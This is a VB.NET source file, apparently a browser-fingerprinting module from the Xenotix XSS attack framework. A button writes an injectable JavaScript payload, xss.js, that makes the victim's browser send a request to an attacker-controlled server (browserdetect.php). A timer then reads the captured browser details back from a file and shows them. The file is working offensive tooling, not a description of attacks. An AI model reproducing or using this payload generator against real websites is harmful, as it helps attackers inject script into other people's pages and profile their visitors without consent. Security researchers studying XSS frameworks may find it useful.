Imports System.IO

Public Class xss_info_browser_fing

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        On Error Resume Next
        Dim ran = New Random()
        Dim tmp = ran.Next(100, 200)
        Dim stream As New IO.StreamWriter(Application.StartupPath & "\xss.js")
        stream.WriteLine("if (document.getElementById('xenotix_brdec" & Str(tmp) & "') == null){ ")
        stream.WriteLine("var xhr; if (window.XMLHttpRequest){xhr=new XMLHttpRequest();} else if (window.ActiveXObject){ xhr=new ActiveXObject('Microsoft.XMLHTTP');}")
        stream.WriteLine("xhr.open('GET', '" & "http://" & xss_server.server_ip & "/browserdetect.php'); xhr.send();")
        stream.WriteLine("script = document.createElement('script');script.id = 'xenotix_brdec" & Str(tmp) & "'; document.body.appendChild(script); }")
        stream.Close()
        Button1.Enabled = False
        Timer1.Enabled = True

    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("browserdetect.txt")
        Me.Close()
    End Sub

    Private Sub xss_info_browser_detect_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        On Error Resume Next
        IO.File.Delete("browserdetect.txt")
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        On Error Resume Next
        Dim line As String = ""
        Dim readfile As System.IO.TextReader = New StreamReader(Application.StartupPath & "\browserdetect.txt")
        line = readfile.ReadToEnd()
        If Not line = "" Then
            WebBrowser1.ScriptErrorsSuppressed = True
            WebBrowser1.DocumentText = line
            Timer1.Enabled = False
        End If
        readfile.Close()
        readfile = Nothing

    End Sub
End Class